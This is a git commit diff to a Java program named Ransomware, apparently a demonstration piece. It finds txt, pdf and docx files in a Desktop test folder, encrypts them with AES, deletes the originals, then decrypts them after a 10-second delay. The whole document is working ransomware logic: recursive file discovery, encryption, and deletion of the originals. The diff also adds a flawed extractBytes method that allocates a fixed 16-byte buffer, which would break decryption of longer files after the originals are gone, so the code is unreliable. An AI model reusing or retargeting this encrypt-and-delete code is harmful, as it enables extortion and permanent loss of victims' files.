4a3f279a3586df89f83a7f4eab5cf0c18b7e3b55
Craig Beaman <Craig.Beaman@unb.ca>
2021-01-06 20:55:09 -0400

    Each file now has its own IV value

--- Ransomware.java
+++ Ransomware.java
@@ -1,5 +1,3 @@
-package ransomware;
-
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
@@ -25,36 +23,83 @@ import javax.crypto.spec.IvParameterSpec;
 public class Ransomware {
 	
 	// In milliseconds, how long to wait before things are decrypted.
-	private static final int DECRYPTION_DELAY = 60000;
+	private static final int DECRYPTION_DELAY = 10000;
+	private static final int IV_LENGTH = 16;
 	private static final String TARGET_DIR = System.getProperty("user.home") + "\\Desktop\\testFolder";
 	private static final String EXTENSION = ".RANSOM";
 
 	private static List<String> targetedExtensions = new ArrayList<String>();
-	private static Cipher cipherEncypt = null, cipherDecrypt = null;
+	private static Cipher cipherEncrypt = null, cipherDecrypt = null;
 	
 	public static void main(String [] args) {
 		
+		// Specify the file types to encrypt
 		final String[] ext = {"txt", "pdf", "docx"};
 		for(String s: ext) {
 			targetedExtensions.add(s);
 		}
 		
+		createCiphers();
+		
+		// Get a list of files to encrypt
+		List<File> targetedFiles = new ArrayList<File>();
+		getAllFiles(TARGET_DIR, targetedFiles);
+		
+		// Generate a secure 256 bit symmetric key for AES to use
+		 SecretKey key = createKey();
+		
+		encryptFiles(targetedFiles, key);
+		deleteOriginals(targetedFiles);
+		
+		System.out.println("Finished encryption. Decrypting files in " 
+		+ DECRYPTION_DELAY / 1000 + " seconds...\nDo not exit this "
+				+ "program or the files will be lost forever.");
 		try {
-			cipherEncypt = Cipher.getInstance("AES/CBC/PKCS5Padding");
+			Thread.sleep(DECRYPTION_DELAY);
+		} catch (InterruptedException e) {
+			e.printStackTrace();
+		}
+
+		targetedFiles.clear();
+		getAllFiles(TARGET_DIR, targetedFiles);
+		
+		decryptFiles(targetedFiles, key);
+		deleteEncryptedFiles(targetedFiles);
+	}
+
+
+	private static void createCiphers() {
+		try {
+			cipherEncrypt = Cipher.getInstance("AES/CBC/PKCS5Padding");
 			cipherDecrypt = Cipher.getInstance("AES/CBC/PKCS5Padding");
 		} catch (NoSuchAlgorithmException | NoSuchPaddingException e1) {
 			e1.printStackTrace();
 		}finally {
-			if(cipherEncypt == null || cipherDecrypt == null) {
+			if(cipherEncrypt == null || cipherDecrypt == null) {
 				System.out.println("Could not create cipher instances.");
 				System.exit(0);
 			}
 		}
-		
-		List<File> results = new ArrayList<File>();
-		getAllFiles(TARGET_DIR, results);
-		
-		// Generate a secure 256 bit symmetric key for AES to use
+	}
+
+	
+	private static void getAllFiles(String directoryName, List<File> files) {
+	    File directory = new File(directoryName);
+
+	    File[] fList = directory.listFiles();
+	    if(fList != null) {
+	        for (File file : fList) {      
+	            if (file.isFile()) {
+	                files.add(file);
+	            } else if (file.isDirectory()) {
+	            	getAllFiles(file.getAbsolutePath(), files);
+	            }
+	        }
+	    }
+	}
+	
+	
+	private static SecretKey createKey() {
 		SecretKey key = null;
 		try {
 			key = generateAESKey();
@@ -67,24 +112,15 @@ public class Ransomware {
 			}
 		}
 		
-		// Initialize the ciphers
-		try {
-			SecureRandom randomSecureRandom = new SecureRandom();
-			byte[] iv = new byte[cipherEncypt.getBlockSize()];
-			randomSecureRandom.nextBytes(iv);
-			IvParameterSpec ivParams = new IvParameterSpec(iv);
-			
-			cipherEncypt.init(Cipher.ENCRYPT_MODE, key, ivParams);
-			cipherDecrypt.init(Cipher.DECRYPT_MODE, key, ivParams);
-		} catch (InvalidKeyException | InvalidAlgorithmParameterException e) {
-			System.out.println("Could not init cipher, invalid key.");
-			e.printStackTrace();
-			System.exit(0);
-		}
-		
-		/* Loop through each file, get its data, encrypt it,
-		*  and then create a new file with the encrypted data.
-		*/
+		return key;
+	}
+	
+	
+	/* 
+	 * Loop through each file, get its data, encrypt it,
+	*  and then create a new file with the encrypted data.
+	*/
+	private static void encryptFiles(List<File> results, SecretKey key) {
 		for(File file: results) {
 			
 			/* Check to see if the file extension is
@@ -95,6 +131,16 @@ public class Ransomware {
 				continue;
 			}
 			
+			IvParameterSpec iv = createRandomIV();
+			
+			// Initialize the encryption cipher with the key and IV
+			try {
+				cipherEncrypt.init(Cipher.ENCRYPT_MODE, key, iv);
+			} catch (InvalidKeyException | InvalidAlgorithmParameterException e) {
+				System.out.println("Could not init encryption cipher.");
+				System.exit(1);
+			}
+			
 			/*
 			 * Get the file data as a byte array and
 			 * then create an encrypted file from it.
@@ -102,37 +148,36 @@ public class Ransomware {
 			byte[] data = getFileData(file);
 			if(data != null) {
 				byte[] encryptedData = encryptData(data);
-				File emptyEncryptedFile = makeEmptyFile(file, true);
-				addEncryptedData(emptyEncryptedFile, encryptedData);
+				File emptyFile = makeEmptyFile(file, true);
+				/*
+				 * Add the IV and then the encrypted data
+				 * to the encrypted file.
+				 */
+				addDataToFile(emptyFile, iv.getIV(), encryptedData);
 			}
 		}
-		
-		/*
-		 * Delete the original, non encrypted files.
-		 */
+	}
+	
+	
+	/*
+	 * Delete the original, non encrypted files.
+	 */
+	private static void deleteOriginals(List<File> results) {
 		for(File file: results) {
 			String extension = getFileExtension(file.getName());
 			if(targetedExtensions.contains(extension)) {
 				file.delete();
 			}
 		}
-		
-		//Wait 60 seconds before decrypting
-		System.out.println("Finished encryption. Decrypting files in 60 seconds...");
-		System.out.println("Do not exit this program or the files will be forever lost.");
-		try {
-			Thread.sleep(DECRYPTION_DELAY);
-		} catch (InterruptedException e) {
-			e.printStackTrace();
-		}
-
-		results.clear();
-		getAllFiles(TARGET_DIR, results);
-		
+	}
+	
+	
+	/* 
+	 * Loop through each file, get its data, decrypt it,
+	*  and then create a new file with the decrypted data.
+	*/
+	private static void decryptFiles(List<File> results, SecretKey key) {
 		System.out.println("Decrypting your files...");
-		/* Loop through each file, get its data, decrypt it,
-		*  and then create a new file with the decrypted data.
-		*/
 		for(File file: results) {
 			// Only decrypt files with extension of EXTENSION
 			String extension = getFileExtension(file.getName());
@@ -140,15 +185,23 @@ public class Ransomware {
 				continue;
 			}
 			
-			byte[] data = getFileData(file);
+			byte[] fileData = getFileData(file);
 			
-			if(data != null) {
-				byte[] decryptedData = decryptData(data);
-				File emptydecryptedFile = makeEmptyFile(file, false);
-				addEncryptedData(emptydecryptedFile, decryptedData);
+			if(fileData != null) {
+				byte[] iv = extractBytes(fileData, 0, IV_LENGTH);
+				byte[] encryptedData = extractBytes(fileData, IV_LENGTH, fileData.length);
+				
+				setIVOfDecryptionCipher(iv, key);
+				
+				byte[] decryptedData = decryptData(encryptedData);
+				File emptyFile = makeEmptyFile(file, false);
+				addDataToFile(emptyFile, decryptedData);
 			}
 		}
-		
+	}
+
+
+	private static void deleteEncryptedFiles(List<File> results) {
 		System.out.println("Deleting .RANSOM files.");
 		for(File file: results) {
 			String extension = getFileExtension(file.getName());
@@ -157,7 +210,37 @@ public class Ransomware {
 			}
 		}
 	}
+	
+	
+	private static void setIVOfDecryptionCipher(byte[] iv, SecretKey key) {
+		IvParameterSpec ivSpec = new IvParameterSpec(iv);
+		try {
+			cipherDecrypt.init(Cipher.DECRYPT_MODE, key, ivSpec);
+		} catch (InvalidKeyException | InvalidAlgorithmParameterException e) {
+			System.out.println("Could not set decryption IV");
+			System.exit(1);
+		}
+	}
 
+
+	private static byte[] extractBytes(byte[] fileData, int start, int end) {
+		byte[] bytesArray = new byte[IV_LENGTH];
+		int indexCounter = 0;
+		for(int i = start; i < end; i++) {
+			bytesArray[indexCounter] = fileData[i];
+			indexCounter++;
+		}
+		return bytesArray;
+	}
+
+
+	private static IvParameterSpec createRandomIV() {
+		SecureRandom random = new SecureRandom();
+		byte[] iv = new byte[cipherEncrypt.getBlockSize()];
+		random.nextBytes(iv);
+		return new IvParameterSpec(iv);
+	}
+	
 
 	private static String getFileExtension(String fileName) {
 		int i = fileName.lastIndexOf('.');
@@ -191,7 +274,7 @@ public class Ransomware {
 	private static byte[] encryptData(byte[] data) {
 		byte[] encryptedData = null;
 		try {
-			encryptedData = cipherEncypt.doFinal(data);
+			encryptedData = cipherEncrypt.doFinal(data);
 		} catch (IllegalBlockSizeException | BadPaddingException e) {
 			System.out.println("Could not encrypt data.");
 			e.printStackTrace();
@@ -236,27 +319,14 @@ public class Ransomware {
 		return newFile;
 	}
 	
-	private static void getAllFiles(String directoryName, List<File> files) {
-	    File directory = new File(directoryName);
-
-	    File[] fList = directory.listFiles();
-	    if(fList != null) {
-	        for (File file : fList) {      
-	            if (file.isFile()) {
-	                files.add(file);
-	            } else if (file.isDirectory()) {
-	            	getAllFiles(file.getAbsolutePath(), files);
-	            }
-	        }
-	    }
-	}
 	
-	
-	private static void addEncryptedData(File encryptedFile, byte[] encryptedData) {
-		String path = encryptedFile.getAbsolutePath();
+	private static void addDataToFile(File file, byte[] ... data) {
+		String path = file.getAbsolutePath();
 		try (FileOutputStream stream = new FileOutputStream(path)) {
 		    try {
-				stream.write(encryptedData);
+		    	for(byte[] array: data) {
+					stream.write(array);
+		    	}
 			} catch (IOException e) {
 				e.printStackTrace();
 			}
